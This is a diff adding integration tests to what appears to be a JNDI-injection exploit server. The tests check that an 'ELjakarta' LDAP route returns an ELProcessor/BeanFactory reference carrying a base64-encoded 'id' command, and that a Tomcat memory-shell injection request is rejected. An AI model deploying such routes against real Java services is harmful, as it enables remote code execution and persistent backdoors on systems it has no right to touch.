@@ -134,6 +134,37 @@ public class LdapServerIntegrationTest {
         }
     }
 
+    // #5: ELjakarta 路由走 RefFactory 直返（jakarta 命名空间类名）。
+    @Test
+    public void elJakartaRouteReturnsDirectReference() throws Exception {
+        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
+            SearchResultEntry entry = conn.searchForEntry("ELjakarta/base64/aWQ=", SearchScope.BASE, "(objectClass=*)");
+            Assert.assertNotNull(entry);
+            Assert.assertEquals("jakarta.el.ELProcessor", entry.getAttributeValue("javaClassName"));
+            Assert.assertEquals("org.apache.naming.factory.BeanFactory", entry.getAttributeValue("javaFactory"));
+            Assert.assertNotNull(entry.getAttributeValues("javaReferenceAddress"));
+            Assert.assertNull(entry.getAttributeValue("javaSerializedData"));
+        }
+    }
+
+    // #5: ELjakarta 内存马注入必须明确报错（仅支持反序列化链），不产出任何 payload 属性。
+    @Test
+    public void elJakartaMemshellRejectedWithError() throws Exception {
+        ByteArrayOutputStream serverLog = new ByteArrayOutputStream();
+        PrintStream originalOut = System.out;
+        System.setOut(new PrintStream(serverLog, true, "UTF-8"));
+        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
+            SearchResultEntry entry = conn.searchForEntry("ELjakarta/memshell/TomcatFilterMemShellFromThread", SearchScope.BASE, "(objectClass=*)");
+            Assert.assertNotNull(entry);
+            Assert.assertNull("拒绝后不得产出 Reference 属性", entry.getAttributeValue("javaReferenceAddress"));
+            Assert.assertNull("拒绝后不得产出序列化数据", entry.getAttributeValue("javaSerializedData"));
+        } finally {
+            System.setOut(originalOut);
+        }
+        Assert.assertTrue("应明确报仅支持反序列化链: " + serverLog,
+                serverLog.toString("UTF-8").contains("仅支持反序列化链"));
+    }
+
     private static int freePort() throws Exception {
         try (ServerSocket socket = new ServerSocket(0)) {
             return socket.getLocalPort();
